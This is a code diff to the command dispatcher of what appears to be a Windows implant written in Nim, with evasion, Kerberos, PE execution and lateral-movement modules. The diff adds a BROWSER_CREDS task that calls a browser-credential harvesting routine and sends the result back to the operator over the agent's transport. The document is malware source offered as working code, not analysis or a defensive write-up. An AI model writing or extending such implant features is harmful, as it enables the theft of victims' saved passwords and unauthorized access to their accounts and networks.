@@ -1,7 +1,7 @@
 ## Command dispatcher for Nim agent.
 import winim/lean, winim/inc/tlhelp32
 import std/[os, osproc, strutils, strformat, json, random, base64]
-import config, transport, evasion, kerberos, pe_exec
+import config, transport, evasion, kerberos, pe_exec, browsercreds
 
 var sleepSecDyn* = SleepSec
 var jitterDyn*   = JitterPct
@@ -1254,5 +1254,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
         t.sendResult(id, "", "LATERAL requires host and cmd"); return
       t.sendResult(id, doLateral(meth, host, user, pass, cmd), "")
     except: t.sendResult(id, "", "lateral: " & getCurrentExceptionMsg())
+  of "BROWSER_CREDS":
+    t.sendResult(id, doBrowserCreds(), "")
   else:
     t.sendResult(id, "", "unknown task type: " & typ)
